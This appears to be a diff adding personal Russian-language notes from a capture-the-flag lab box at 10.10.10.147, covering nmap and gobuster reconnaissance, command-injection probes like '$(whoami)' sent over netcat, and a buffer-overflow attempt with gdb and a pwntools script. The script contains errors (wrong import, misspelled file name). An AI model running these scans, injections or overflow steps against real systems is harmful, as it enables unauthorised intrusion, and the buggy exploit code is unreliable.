@@ -1,0 +1,50 @@
+nmap -sC -sV -sA 10.10.10.147
+
+gobuster dir -u http://10.10.10.147/ -w /usr/share/wordlist/dirbustre/directory-list-2.3-medium.txt -o root-dir
+
+nmap -p- -v 10.10.10.147
+
+nc 10.10.10.147 1337
+$(whoami)
+or
+`whoami`
+
+ncat 10.10.10.147 1337
+
+В даном примере есть апка
+
+Делаем анализ с помощю Gidra
+
+откроем редактором 
+
+chmod +x myapp
+gdb ./myapp
+
+Для того чтобы сделать переполнение буфера необходимо вести то количество байт которое обозначено в в апке.
+
+для этого мы создаем мини скрипт с тем количеством что нам нужно символов
+
+python -c 'print "A"*112'
+python -c 'print "A"*114'
+python -c 'print "A"*116' и так пока не получим переполнение.
+
+Пишем експлойт exploit.py fo myapp
+**********************************************************
+#0x40115f - main
+from pwd import *
+context(terminal=['tmux','new-windows'])
+p = gdb.debug('./muapp', 'b main')
+context(os='linux', arch='amd64')
+
+junk = ("A" * 120).encode()
+call_main = p64(0x40115f)
+
+p.sendline(junk + call_main)
+
+
+********************************************************
+wq!
+
+
+
+
